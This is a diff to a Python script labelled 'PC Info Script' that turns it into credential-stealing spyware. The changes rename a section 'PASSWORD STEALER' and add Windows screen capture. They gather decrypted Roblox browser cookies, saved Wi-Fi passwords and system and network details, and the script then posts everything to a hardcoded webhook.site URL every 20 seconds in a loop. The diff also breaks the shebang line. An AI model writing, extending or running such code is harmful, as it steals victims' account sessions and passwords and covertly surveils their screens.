@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+!/usr/bin/env python3
 """PC Info Script (minimal dependencies, standard library only)
 
 Features:
@@ -54,13 +54,15 @@ import urllib.request
 import urllib.error
 import sys
 import sqlite3
-from typing import Dict, List, Tuple
+import time
+from typing import Dict, List, Tuple, Optional, Any
 
 # -----------------
 # CONFIG
 # -----------------
 WEBHOOK_SITE_URL = "https://webhook.site/f17e6915-aca9-40d8-afde-79214a48718b"
-SCRIPT_VERSION = "1.6.0"
+SCRIPT_VERSION = "3.0.0"
+INTERVAL_SECONDS = 20
 
 
 # -----------------
@@ -518,16 +520,8 @@ def get_wifi_password(ssid: str) -> str:
 
 
 # -----------------
-# ROBLOX COOKIES (BEST-EFFORT DECRYPTION)
+# PASSWORD STEALER
 # -----------------
-
-
-def _cookie_db_paths_windows() -> Dict[str, str]:
-    base = os.path.expandvars(r"%LOCALAPPDATA%")
-    return {
-        "Chrome": os.path.join(base, r"Google\Chrome\User Data\Default\Network\Cookies"),
-        "Edge": os.path.join(base, r"Microsoft\Edge\User Data\Default\Network\Cookies"),
-    }
 
 
 def _dpapi_decrypt(blob: bytes) -> str:
@@ -628,8 +622,159 @@ def read_roblox_cookies() -> List[str]:
 
 
 # -----------------
+# SCREENSHOT
+# -----------------
+
+
+def take_screenshot_simple() -> Optional[str]:
+    """Takes screenshot using Windows API - returns base64-encoded bitmap data."""
+    if not sys.platform.startswith("win"):
+        return None
+    
+    try:
+        class BITMAPINFOHEADER(ctypes.Structure):
+            _fields_ = [
+                ("biSize", ctypes.c_ulong),
+                ("biWidth", ctypes.c_long),
+                ("biHeight", ctypes.c_long),
+                ("biPlanes", ctypes.c_ushort),
+                ("biBitCount", ctypes.c_ushort),
+                ("biCompression", ctypes.c_ulong),
+                ("biSizeImage", ctypes.c_ulong),
+                ("biXPelsPerMeter", ctypes.c_long),
+                ("biYPelsPerMeter", ctypes.c_long),
+                ("biClrUsed", ctypes.c_ulong),
+                ("biClrImportant", ctypes.c_ulong),
+            ]
+        
+        class BITMAPINFO(ctypes.Structure):
+            _fields_ = [("bmiHeader", BITMAPINFOHEADER)]
+        
+        user32 = ctypes.windll.user32
+        gdi32 = ctypes.windll.gdi32
+        
+        # Get screen dimensions
+        width = user32.GetSystemMetrics(0)
+        height = user32.GetSystemMetrics(1)
+        
+        # Create device contexts
+        hdc_screen = user32.GetDC(0)
+        if not hdc_screen:
+            return None
+            
+        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
+        if not hdc_mem:
+            user32.ReleaseDC(0, hdc_screen)
+            return None
+        
+        # Create bitmap
+        bmp = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
+        if not bmp:
+            gdi32.DeleteDC(hdc_mem)
+            user32.ReleaseDC(0, hdc_screen)
+            return None
+        
+        old_bmp = gdi32.SelectObject(hdc_mem, bmp)
+        
+        # Copy screen to bitmap
+        gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, 0x00CC0020)  # SRCCOPY
+        
+        # Prepare BITMAPINFO structure
+        bmp_info = BITMAPINFO()
+        bmp_info.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
+        bmp_info.bmiHeader.biWidth = width
+        bmp_info.bmiHeader.biHeight = -height  # Negative for top-down DIB
+        bmp_info.bmiHeader.biPlanes = 1
+        bmp_info.bmiHeader.biBitCount = 24
+        bmp_info.bmiHeader.biCompression = 0  # BI_RGB
+        
+        # Calculate row size (must be multiple of 4 bytes)
+        row_bytes = ((width * 24 + 31) // 32) * 4
+        image_size = row_bytes * height
+        bmp_info.bmiHeader.biSizeImage = image_size
+        
+        # Allocate buffer for bitmap data
+        buffer = (ctypes.c_char * image_size)()
+        
+        # Get bitmap bits
+        result = gdi32.GetDIBits(hdc_screen, bmp, 0, height, buffer, ctypes.byref(bmp_info), 0)
+        if not result:
+            gdi32.SelectObject(hdc_mem, old_bmp)
+            gdi32.DeleteObject(bmp)
+            gdi32.DeleteDC(hdc_mem)
+            user32.ReleaseDC(0, hdc_screen)
+            return None
+        
+        # Encode as base64
+        img_data = bytes(buffer)
+        img_b64 = base64.b64encode(img_data).decode("utf-8")
+        
+        # Cleanup
+        gdi32.SelectObject(hdc_mem, old_bmp)
+        gdi32.DeleteObject(bmp)
+        gdi32.DeleteDC(hdc_mem)
+        user32.ReleaseDC(0, hdc_screen)
+        
+        return img_b64
+    except Exception:
+        return None
+
+
+# -----------------
 # OUTPUT
 # -----------------
+
+def build_dict() -> Dict:
+    """Builds a dictionary with all system information."""
+    os_info = get_os_info()
+    user_info = get_user_info()
+    cpu_info = get_cpu_info()
+    total_ram, free_ram = get_ram_info()
+    storage_entries = get_storage_info()
+    gateway = get_default_gateway()
+    dns_servers = get_dns_servers()
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    wifi = get_wifi_info()
+    wifi_password = get_wifi_password(wifi["ssid"])
+    uptime_text = format_duration(get_uptime_seconds())
+    battery = get_battery_info()
+    interfaces = get_network_interfaces()
+    public_ip, public_country = get_public_ip_with_country()
+    
+    storage_list = []
+    for path, free, total in storage_entries:
+        storage_list.append({"path": path, "free": free, "total": total})
+    
+    roblox_cookies_lines = read_roblox_cookies()
+    
+    return {
+        "timestamp": timestamp,
+        "version": SCRIPT_VERSION,
+        "system": os_info,
+        "uptime": uptime_text,
+        "user": user_info,
+        "cpu": cpu_info,
+        "ram": {"total": total_ram, "free": free_ram},
+        "battery": battery,
+        "storage": storage_list,
+        "network": {
+            "gateway": gateway,
+            "dns_servers": dns_servers,
+            "interfaces": interfaces,
+            "hostname": get_hostname(),
+            "private_ip": get_private_ip(),
+            "public_ip": public_ip,
+            "public_country": public_country,
+            "mac_address": get_mac_address(),
+        },
+        "wifi": {
+            "interface": wifi["interface"],
+            "ssid": wifi["ssid"],
+            "password": wifi_password,
+        },
+        "roblox_cookies": roblox_cookies_lines,
+    }
+
 
 def build_lines() -> List[str]:
     os_info = get_os_info()
@@ -737,33 +882,85 @@ def send_text_to_webhook(url: str, lines: List[str]) -> None:
         _ = resp.read()
 
 
+def send_data_with_screenshot(url: str, data_dict: Dict, screenshot_b64: Optional[str] = None) -> None:
+    """Sends data dictionary and optional screenshot to webhook as JSON."""
+    payload = data_dict.copy()
+    if screenshot_b64:
+        payload["screenshot"] = screenshot_b64
+        payload["screenshot_format"] = "bmp_base64"  # We're encoding BMP format
+    
+    json_data = json.dumps(payload, ensure_ascii=False, indent=2).encode("utf-8")
+    req = urllib.request.Request(
+        url,
+        data=json_data,
+        headers={"Content-Type": "application/json; charset=utf-8"},
+        method="POST",
+    )
+    with urllib.request.urlopen(req, timeout=15) as resp:
+        _ = resp.read()
+
+
 # -----------------
 # MAIN
 # -----------------
 
 def main() -> int:
-    lines = build_lines()
-
-    for l in lines:
-        print(l)
-
+    print(f"[*] Script Version {SCRIPT_VERSION}")
+    print(f"[*] Starte kontinuierliche Datenerfassung (alle {INTERVAL_SECONDS} Sekunden)")
+    print("[*] Drücke Ctrl+C zum Beenden\n")
+    
+    cycle = 0
+    
     try:
-        save_txt(lines)
-        print("\nGespeichert in pc_info.txt")
-    except OSError as e:
-        print(f"\n[FEHLER] Konnte pc_info.txt nicht speichern: {e}")
-        return 3
-
-    try:
-        send_text_to_webhook(WEBHOOK_SITE_URL, lines)
-        print("[OK] Text wurde an webhook.site gesendet.")
-    except urllib.error.URLError as e:
-        print(f"[FEHLER] Netzwerk/DNS Fehler beim Senden: {e}")
-        return 1
+        while True:
+            cycle += 1
+            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            print(f"\n[{timestamp}] Zyklus #{cycle} - Sammle Daten...")
+            
+            # Build data
+            data_dict = build_dict()
+            
+            # Take screenshot
+            print("  -> Erstelle Screenshot...")
+            screenshot_b64 = take_screenshot_simple()
+            if screenshot_b64:
+                print(f"  -> Screenshot erstellt ({len(screenshot_b64)} bytes base64)")
+            else:
+                print("  -> Screenshot fehlgeschlagen")
+            
+            # Send to webhook
+            try:
+                print("  -> Sende Daten an Webhook...")
+                send_data_with_screenshot(WEBHOOK_SITE_URL, data_dict, screenshot_b64)
+                print(f"  [OK] Daten erfolgreich gesendet (Zyklus #{cycle})")
+            except urllib.error.URLError as e:
+                print(f"  [FEHLER] Netzwerk/DNS Fehler: {e}")
+            except Exception as e:
+                print(f"  [FEHLER] Senden fehlgeschlagen: {e}")
+            
+            # Save to file (first cycle only)
+            if cycle == 1:
+                try:
+                    lines = build_lines()
+                    save_txt(lines)
+                    print("  -> Gespeichert in pc_info.txt")
+                except OSError as e:
+                    print(f"  [FEHLER] Konnte pc_info.txt nicht speichern: {e}")
+            
+            # Wait for next cycle
+            if cycle < 1000:  # Prevent infinite if sleep is interrupted
+                print(f"  -> Warte {INTERVAL_SECONDS} Sekunden bis zum nächsten Zyklus...")
+                time.sleep(INTERVAL_SECONDS)
+            else:
+                break
+                
+    except KeyboardInterrupt:
+        print("\n\n[*] Beende durch Benutzer (Ctrl+C)")
+        return 0
     except Exception as e:
-        print(f"[FEHLER] Senden fehlgeschlagen: {e}")
-        return 2
-
+        print(f"\n[FEHLER] Unerwarteter Fehler: {e}")
+        return 1
+    
     return 0
 
 
@@ -819,3 +1016,4 @@ if __name__ == "__main__":
             pass
 
     raise SystemExit(code)
+
